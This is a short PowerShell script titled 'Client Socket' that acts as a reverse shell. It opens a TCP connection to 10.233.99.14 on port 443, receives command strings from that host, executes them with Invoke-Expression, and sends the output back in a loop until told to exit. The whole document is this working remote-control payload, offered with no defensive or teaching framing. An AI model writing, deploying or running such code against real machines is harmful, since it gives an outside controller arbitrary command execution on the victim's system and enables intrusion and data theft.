#############################
# Title - Client Socket
# Date - 17/09/2017
# Author - Rémi LIQUETE
#############################


############ FUNCTION ################

function GetOutput($stream)
{
    ## Create a buffer to receive the response
    $buffer = new-object System.Byte[] 2048
    $encoding = new-object System.Text.AsciiEncoding

    $outputBuffer = ""
    $foundMore = $false

    start-sleep -m 1000

    $read = $stream.Read($buffer, 0, 2048)
    $outputBuffer += ($encoding.GetString($buffer, 0, $read))
    
    return $outputBuffer
}

############ BODY ####################

$TCPIP = "10.233.99.14"
$TCPIP = [System.Net.IPAddress]::Parse($TCPIP)
$TCPPort = 443

$client = New-Object System.Net.Sockets.TcpClient($TCPIP, $TCPPort)

$tcpStream = $client.GetStream()
$writer = New-Object System.IO.StreamWriter($tcpStream)

try {
    
    while ($true){
        
        $response = GetOutput $tcpStream

        if($response -eq '1'){

            $response = $response = GetOutput $tcpStream
            $return = Invoke-Expression $response
            $return = $return -join "`r`n"

            $return = [System.Text.Encoding]::ASCII.GetString(([System.Text.Encoding]::GetEncoding(1251)).getBytes($return))
            $data = [System.Text.Encoding]::ASCII.GetBytes($return)
            Write-Host "Sending $($data.count) bytes"
            $writer.Write($data, 0, $data.Length)
            $writer.WriteLine($data)
            $writer.Flush()
        }
        elseif($response -eq 'Exit'){
            $client.Dispose()
            $client.Close()
        }
    }
}

catch{
    Write-Error $_
}

finally{
    $client.Dispose()
    $client.Close()
    Write-Host "Session Stopped"
}
